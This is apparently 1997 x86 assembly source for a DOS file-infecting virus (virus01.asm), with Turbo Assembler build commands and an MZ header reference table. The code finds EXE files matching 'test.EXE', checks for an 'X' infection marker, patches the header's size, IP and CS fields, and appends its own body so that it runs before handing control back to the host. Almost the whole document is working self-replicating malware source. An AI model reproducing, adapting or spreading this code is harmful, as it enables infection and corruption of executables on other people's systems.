;
; This code completed: ??/04/97
; Version 2.0
;
; Created with Turbo Assembler:
;   tasm virus01.asm /z /p /m3
;   tlink virus01.obj /3
;
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;
.MODEL SMALL
.STACK 256                              
.386                                    
;
; * * * * * * * * * * * * *
;
Code    SEGMENT 'CODE' USE16
        ASSUME cs:Code,ds:VCode,es:VCode
;
ProgStart:
        mov  ax,VCode
        mov  ds,ax
        mov  OldCS,Code
        mov  OldIPpos,offset ExitProg
        jmp  far ptr Beginning                  
ExitProg:
        mov  ax,4C00h                   
        int  21h

Code    ENDS
;
; * * * * * * * * * * * * *
;
VCode   SEGMENT 'VCODE' USE16
        ASSUME cs:VCode,ds:VCode,es:VCode
;
NewCode LABEL BYTE
;
NewName db 'test.EXE',13 dup(0)            
NewHandle dw 0                          
NewSize dd 0                            
NewHdrSize dw 0                         
NewLastPage dw 0                        
NewFileSize dw 0                        
OldIPpos dw 0
OldCS dw 0
Buffer dw 0
Ctr1 dw 0                                
Ctr2 dw 0                             
DTA db 42 dup(0)                        
;
Beginning:                              
        mov  ax,cs                      
        mov  ds,ax                      
        mov  ax,OldIPpos
        mov  fs,ax
        mov  ax,OldCS
        mov  gs,ax
;
; Search for a new file
;
            mov  ah,1Ah                 
            mov  dx,offset DTA
            int  21h                    
        jc   Error                      
            mov  ah,4Eh                 
            mov  al,00h                 
            mov  cx,0                   
            mov  dx,offset NewName
            int  21h
        jc   Error                      
;
; Open the File
;
            mov  dx,offset DTA
            add  dx,1Eh            
            mov  ax,3D02h
            int  21h
        jc   SearchLoop                 
        mov  NewHandle,ax         
;
; Get & calc the actual file size
;
        xor  eax,eax                    
        xor  esi,esi
            mov  bx,NewHandle
            mov  cx,0
            mov  dx,2                   
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2                   
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,Buffer
        mov  NewLastPage,ax
        mov  di,ax
            mov  bx,NewHandle
            mov  cx,0
            mov  dx,4
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2                   
            mov  ah,3Fh                 
            int  21h                    
        jc   SearchLoop                 
        mov  si,Buffer
        mov  NewFileSize,si
        mov  bx,di                      
        shl  esi,9                      
        mov  ax,512                     
        sub  ax,bx                      
        sub  esi,eax                    
        mov  NewSize,esi
;
; If prog already in file then search for another file
;
            mov  bx,NewHandle
            mov  cx,word ptr NewSize[0]                   
            mov  dx,word ptr NewSize[2]
            sub  dx,10
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,Buffer
        cmp  ah,'X'                     
        je   SearchLoop                 
        cmp  al,'X'                     
        je   SearchLoop
;
; file available
;
        xor  ax,ax                      
        jz   Continue                   
;
; Main Search loop
;
    SearchLoop:
            mov  ah,4Fh                 
            int  21h                    
        jc   Error                      
;
; Open the File                         
;
            mov  dx,offset DTA
            add  dx,1Eh
            mov  ax,3D02h
            int  21h
        jc   SearchLoop
        mov  NewHandle,ax         
;
; Get & calc the actual file size
;
        xor  eax,eax
        xor  esi,esi
            mov  bx,NewHandle
            mov  cx,0
            mov  dx,2
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,Buffer
        mov  NewLastPage,ax
        mov  di,ax
            mov  bx,NewHandle
            mov  cx,0
            mov  dx,4
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  si,Buffer
        mov  NewFileSize,si
        mov  bx,di
        shl  esi,9
        mov  ax,512
        sub  ax,bx
        sub  esi,eax
        mov  NewSize,esi
;
; If prog already in file then search for another file
;
            mov  bx,NewHandle
            mov  cx,word ptr NewSize[0]
            mov  dx,word ptr NewSize[2]
            sub  dx,10
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,Buffer
        cmp  ah,'X'
        je   SearchLoop
        cmp  al,'X'
        je   SearchLoop
;
; If got this far then file available
;
    Continue:                           
;
; Increase load module size in Header
;
        mov  ax,NewFileSize
        add  ax,2 
        mov  Buffer,ax
            mov  bx,NewHandle
            mov  cx,0
            mov  dx,4
            mov  ax,4200h
            int  21h
        jc   Error                      
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2                   
            mov  ah,40h
            int  21h
        jc   Error
;
; Get the Header Size
;
            mov  bx,NewHandle
            mov  cx,0                   
            mov  dx,8                   
            mov  ax,4200h
            int  21h
        jc   Error
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2                   
            mov  ah,3Fh                 
            int  21h
        jc   Error
        mov  ax,Buffer
        shl  ax,4
        mov  NewHdrSize,ax
;
; Get the file's IP
;
            mov  bx,NewHandle
            mov  cx,0                   
            mov  dx,14h
            mov  ax,4200h
            int  21h
        jc   Error
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   Error
        mov  ax,Buffer
        mov  OldIPpos,ax
;
; Set the new IP
;
        mov  ax,offset Beginning              
        mov  Buffer,ax
            mov  Buffer,ax
            mov  bx,NewHandle
            mov  cx,0                   
            mov  dx,14h                 
            mov  ax,4200h               
            int  21h
        jc   Error                      
            mov  bx,NewHandle
            mov  dx,offset Buffer                  
            mov  cx,2                   
            mov  ah,40h
            int  21h
        jc   Error
;
; Get the file's CS
;
            mov  bx,NewHandle
            mov  cx,0                   
            mov  dx,16h
            mov  ax,4200h
            int  21h
        jc   Error
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   Error
        mov  ax,Buffer
        mov  OldCS,ax
;
; Calc new CS
;
        mov  eax,NewSize
        sub  eax,512
        shr  eax,4
        add  ax,1
;
; Write New CS
;
        mov  Buffer,ax
            mov  Buffer,ax
            mov  bx,NewHandle
            mov  cx,0                   
            mov  dx,16h                 
            mov  ax,4200h               
            int  21h
        jc   Error                      
            mov  bx,NewHandle
            mov  dx,offset Buffer                  
            mov  cx,2                   
            mov  ah,40h
            int  21h
        jc   Error
;
; Replicate Code
;
        mov  eax,NewSize
        and  al,0F0h
        add  eax,10h
        mov  Ctr1,ax               
        mov  ax,offset EndCode
        mov  Ctr2,ax
        mov  si,0
    WriteLoop:
        mov  ax,[si]
        mov  Buffer,ax
            mov  bx,NewHandle
            mov  cx,0
            mov  dx,Ctr1
            mov  ax,4200h               
            int  21h
        jc   Error
            mov  bx,NewHandle
            mov  dx,offset Buffer
            mov  cx,2
            mov  ah,40h
            int  21h
        jc   Error
        mov  ax,2
        add  Ctr1,ax
        add  si,ax
        cmp  si,Ctr2
        jb   WriteLoop
;
; Close the file
;
            mov  bx,NewHandle
            mov  ah,3Eh                 
            int  21h
        jc   Error
;
; If error or end of prog jump to here
;
Error:
        mov  ax,fs
        mov  OldIPpos,ax
        mov  ax,gs
        mov  OldCS,ax
        jmp  dword ptr OldIPpos
;
EndIDword db 130 dup('X')
;
EndCode LABEL BYTE
;
VCode   ENDS
;
; * * * * * * * * * * * * *
;
END ProgStart
;
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; EXE header:
;
; Hex Offset    Contents       
; ----------    --------
;   00-01       4Dh,4Ah (MZ)
;   02-03       bytes in last page
;   04-05       file size in 512 byte pages
;   06-07       num relocation entries
;   08-09       header size in paras
;   0A-0B       min paras required above end of program
;   0C-0D       max paras required above end of program
;   0E-0F       initial stack seg before relocation
;   10-11       initial stack pointer value
;   12-13       neg sum of words in file
;   14-15       initial instruction pointer value
;   16-17       initial code seg before relocation
;   18-19       relative offset from beginning of run file to relocation table
;   1A-1B       overlay number
;
